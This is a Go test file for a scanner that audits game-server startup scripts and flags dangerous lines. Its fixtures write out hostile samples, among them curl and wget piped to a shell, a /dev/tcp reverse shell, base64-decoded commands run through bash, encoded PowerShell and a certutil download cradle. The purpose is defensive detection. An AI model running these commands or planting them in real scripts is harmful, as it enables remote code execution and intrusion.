package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writeStartupScript(t *testing.T, dir, name, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
		t.Fatalf("write %s: %v", name, err)
	}
}

func startupHas(a *ServerStartupAudit, reason string) bool {
	for _, f := range a.Findings {
		if f.Reason == reason {
			return true
		}
	}
	return false
}

func TestStartupMissingDir(t *testing.T) {
	a := AuditServerStartupScripts(filepath.Join(t.TempDir(), "nope"))
	if a.Blocking() {
		t.Fatalf("missing dir should not block")
	}
	if !startupHas(a, startupReasonMissing) {
		t.Fatalf("want missing, got %v", a.Codes())
	}
}

func TestStartupCleanScript(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "start.sh", "#!/bin/sh\njava -Xmx4G -jar server.jar nogui\n")
	a := AuditServerStartupScripts(dir)
	if a.Blocking() || a.HasWarnings() {
		t.Fatalf("clean script flagged: %s", a.Describe())
	}
	if len(a.Scripts) != 1 || a.Scripts[0] != "start.sh" {
		t.Fatalf("scripts=%v", a.Scripts)
	}
}

func TestStartupRemotePipeBlocks(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "start.sh", "curl -fsSL https://example.com/x.sh | bash\n")
	a := AuditServerStartupScripts(dir)
	if !a.Blocking() {
		t.Fatalf("want blocking, got %v", a.Codes())
	}
	if !startupHas(a, startupReasonRemotePipe) {
		t.Fatalf("want remote-pipe, got %v", a.Codes())
	}
}

func TestStartupWgetPipeBlocks(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "run.sh", "wget -qO- http://example.com/i | sh -s -- -y\n")
	a := AuditServerStartupScripts(dir)
	if !startupHas(a, startupReasonRemotePipe) {
		t.Fatalf("want remote-pipe, got %v", a.Codes())
	}
}

func TestStartupEncodedPowerShellBlocks(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "start.bat", "powershell.exe -NoProfile -EncodedCommand SQBFAFgA\n")
	a := AuditServerStartupScripts(dir)
	if !startupHas(a, startupReasonEncodedPower) {
		t.Fatalf("want encoded-powershell, got %v", a.Codes())
	}
}

func TestStartupReverseShellBlocks(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "run.sh", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
	a := AuditServerStartupScripts(dir)
	if !startupHas(a, startupReasonReverseShell) {
		t.Fatalf("want reverse-shell, got %v", a.Codes())
	}
}

func TestStartupBase64PipeBlocks(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "start.sh", "echo aGVsbG8= | base64 -d | bash\n")
	a := AuditServerStartupScripts(dir)
	if !a.Blocking() {
		t.Fatalf("want blocking")
	}
	if !startupHas(a, startupReasonBase64Pipe) {
		t.Fatalf("want base64-pipe, got %v", a.Codes())
	}
}

func TestStartupJavaAgentBlocks(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "start.sh", "java -javaagent:/tmp/evil.jar -jar server.jar nogui\n")
	a := AuditServerStartupScripts(dir)
	if !startupHas(a, startupReasonJavaAgent) {
		t.Fatalf("want javaagent, got %v", a.Codes())
	}
}

func TestStartupDownloadCradleWarns(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "start.bat", "certutil -urlcache -split -f http://x/a.exe a.exe\n")
	a := AuditServerStartupScripts(dir)
	if a.Blocking() {
		t.Fatalf("download cradle should warn only")
	}
	if !startupHas(a, startupReasonDownloadCradle) {
		t.Fatalf("want download-cradle, got %v", a.Codes())
	}
}

func TestStartupEvalShellBlocks(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "run.sh", "eval $(curl -s http://x/y)\n")
	a := AuditServerStartupScripts(dir)
	if !startupHas(a, startupReasonEvalShell) {
		t.Fatalf("want eval-shell, got %v", a.Codes())
	}
}

func TestStartupBroadDeleteWarns(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "start.sh", "rm -rf /tmp/cache\n")
	a := AuditServerStartupScripts(dir)
	if !startupHas(a, startupReasonBroadDelete) {
		t.Fatalf("want broad-delete, got %v", a.Codes())
	}
}

func TestStartupChmodWorldWarns(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "start.sh", "chmod 777 ./logs\njava -jar server.jar nogui\n")
	a := AuditServerStartupScripts(dir)
	if a.Blocking() {
		t.Fatalf("chmod warn should not block")
	}
	if !a.HasWarnings() || !startupHas(a, startupReasonWorldChmod) {
		t.Fatalf("want chmod warning, got %v", a.Codes())
	}
}

func TestStartupSudoWarns(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "start.sh", "sudo java -jar server.jar nogui\n")
	a := AuditServerStartupScripts(dir)
	if !startupHas(a, startupReasonSudo) {
		t.Fatalf("want sudo, got %v", a.Codes())
	}
}

func TestStartupEmbeddedSecretWarns(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "start.sh", "export DISCORD_WEBHOOK=https://discord.com/api/webhooks/1/x\njava -jar server.jar\n")
	a := AuditServerStartupScripts(dir)
	if !startupHas(a, startupReasonEmbeddedSecret) {
		t.Fatalf("want embedded-secret, got %v", a.Codes())
	}
}

func TestStartupSymlinkBlocks(t *testing.T) {
	dir := t.TempDir()
	target := filepath.Join(dir, "real.sh")
	if err := os.WriteFile(target, []byte("java -jar server.jar\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, filepath.Join(dir, "start.sh")); err != nil {
		t.Skipf("symlink unsupported: %v", err)
	}
	a := AuditServerStartupScripts(dir)
	if !a.Blocking() || !startupHas(a, startupReasonSymlink) {
		t.Fatalf("want symlink block, got %v", a.Codes())
	}
}

func TestStartupOversizedFileWarns(t *testing.T) {
	dir := t.TempDir()
	big := strings.Repeat("echo ok\n", (startupMaxBytes/8)+32)
	writeStartupScript(t, dir, "start.sh", big)
	a := AuditServerStartupScripts(dir)
	if !startupHas(a, startupReasonTooLarge) {
		t.Fatalf("want too-large, got %v", a.Codes())
	}
}

func TestStartupDirectoryWarns(t *testing.T) {
	dir := t.TempDir()
	if err := os.Mkdir(filepath.Join(dir, "start.sh"), 0o755); err != nil {
		t.Fatal(err)
	}
	a := AuditServerStartupScripts(dir)
	if !startupHas(a, startupReasonNotRegular) {
		t.Fatalf("want not-regular, got %v", a.Codes())
	}
}

func TestStartupMultipleScripts(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "start.sh", "java -jar server.jar\n")
	writeStartupScript(t, dir, "start.bat", "java -jar server.jar\n")
	a := AuditServerStartupScripts(dir)
	if len(a.Scripts) != 2 {
		t.Fatalf("scripts=%v", a.Scripts)
	}
	if a.Blocking() {
		t.Fatalf("both clean should not block")
	}
}

func TestStartupCodesSortedUnique(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "start.sh", "curl http://x/a | bash\npowershell -enc AAAA\n")
	a := AuditServerStartupScripts(dir)
	codes := a.Codes()
	if len(codes) < 2 {
		t.Fatalf("codes=%v", codes)
	}
	for i := 1; i < len(codes); i++ {
		if codes[i-1] > codes[i] {
			t.Fatalf("codes not sorted: %v", codes)
		}
	}
}

func TestStartupDescribeStable(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "start.sh", "curl http://x/a | bash\n")
	a := AuditServerStartupScripts(dir)
	d1 := a.Describe()
	d2 := a.Describe()
	if d1 != d2 {
		t.Fatalf("describe unstable: %q vs %q", d1, d2)
	}
	if !strings.Contains(d1, "remote-pipe") {
		t.Fatalf("describe=%q", d1)
	}
}

func TestStartupSummaryCounts(t *testing.T) {
	dir := t.TempDir()
	writeStartupScript(t, dir, "start.sh", "chmod 777 logs\njava -jar server.jar\n")
	a := AuditServerStartupScripts(dir)
	if !strings.Contains(a.Summary(), "告警 1") {
		t.Fatalf("summary=%q", a.Summary())
	}
}
